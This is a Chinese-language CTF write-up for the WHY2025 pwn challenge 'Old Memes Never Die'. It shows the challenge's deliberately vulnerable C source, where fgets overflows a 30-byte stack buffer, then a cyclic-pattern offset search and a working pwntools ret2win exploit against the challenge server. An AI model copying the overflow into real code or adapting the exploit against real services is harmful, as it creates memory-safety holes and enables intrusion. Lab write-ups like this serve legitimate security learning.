# old-memes-never-die

## Metadata

- Event: WHYCTF 2025
- Category: pwn
- Challenge: Old Memes Never Die

## Status

- Draft

## Notes

- 原始檔已放在 `src/old-memes.c`。
---
title: WHY2025_Old Memes Never Die
tags: [pwn, CTF]

---

Old Memes Never Die
這題有給原始碼
一開始先編譯` gcc -m32 -fno-stack-protector -o old-memes old-memes.c`


然後打開.c檔案查看，很明顯看到main裡面有print_flag，再來是ask_what和ask_name。
可以想像的到就是利用print_flag洩漏出來的地址，然後用ask_name達到buffer overflow，跳到print_flag。

先搞清楚整個邏輯，會先碰到ask_what，然後會去比對你輸入的是否是what?，如果是的話，才會繼續往下問你的名字。

![image](https://hackmd.io/_uploads/S17YaArule.png)

![image](https://hackmd.io/_uploads/Syyc6CH_xx.png)


```
/* Old Memes Never Die 
 * compile without protection, because protection is for Tonies!
 * gcc -m32 -fno-stack-protector -o old-memes old-memes.c
 */

#include <stdio.h>
#include <string.h>


int print_flag(){
    printf("You have reached the flag function!\n");
    FILE *fptr = fopen("/flag", "r");
    if (fptr == NULL){
        return 1;
    }
    
    char flag[39];
    while (fgets(flag, sizeof(flag), fptr) != NULL){
        printf("F* YOU and your flag: %s !!!", flag);
    }
    fclose(fptr);
    return 0;
}

int ask_what(){
    char what[8];
    char check[6] = "what?";

    printf("\n\nWhat is your name?\n> ");
    fgets(what, sizeof(what), stdin);
    what[strcspn(what, "\r\n")] = 0;
    if (strcmp(check, what) != 0)
        return 1;
    return 0;
}

int ask_name(){
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
    name[strcspn(name, "\r\n")] = 0;
    printf("F* YOU %s!\n", name);
}

int main(){
    setbuf(stdout, 0);
    printf("(do with this information what you want, but the print_flag function can be found here: %p)\n", print_flag);

    if(ask_what())
        return 1;
    ask_name();
    return 0;
}

```

----
## Offest
下中斷點在 b main , run 執行
產生字串
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
![image](https://hackmd.io/_uploads/HyAE0Cruxg.png)

![image](https://hackmd.io/_uploads/H1c06CBOex.png)
![image](https://hackmd.io/_uploads/SkK7CRH_eg.png)

得到offset = 42

因為是32位元，所以42+2 = 46，這 +4 個位元組，就是要用來覆寫返回位址的、print_flag 函式的記憶體位址本身。

fgets(name, 48, stdin)， 最多只會讀取 size - 1，也就是 47 個字元。
Payload：長度為 offset (42) + address (4) = 46 位元組。
Payload 長度 (46) 小於 fgets 的限制 (47)。因此，我們可以使用最標準的 sendline 方法，它會自動在 payload 後面加上 \n，fgets 看到 \n 後會正常結束讀取，我們的 46 位元組 payload 會被完整接收。


----

## Payload
```

from pwn import *

HOST = "old-memes-never-die.ctf.zone"
PORT = 4242

try:

    p = remote(HOST, PORT)
    

    p.recvuntil(b'here: ')
    leaked_line = p.recvline()
    leaked_addr_str = leaked_line.strip().split(b')')[0]
    target_address = int(leaked_addr_str, 16)

 
    p.sendlineafter(b'> ', b'what?')


    offset = 42
    

    payload = flat([
        b'A' * offset,
        p32(target_address)
    ])


    p.sendlineafter(b'> ', payload)


    response = p.recvall(timeout=3).decode(errors='ignore')
    print("成功！伺服器回應：")
    print(response)

except Exception as e:
    log.failure(f"攻擊過程中發生錯誤: {e}")
finally:
    if 'p' in locals() and p.connected():
        p.close()
```

---
## 結論

這一題還算是挺簡單的，適合給我這種甚麼都不會的人來試試，只要了解基礎的buffer overflow原理即可。
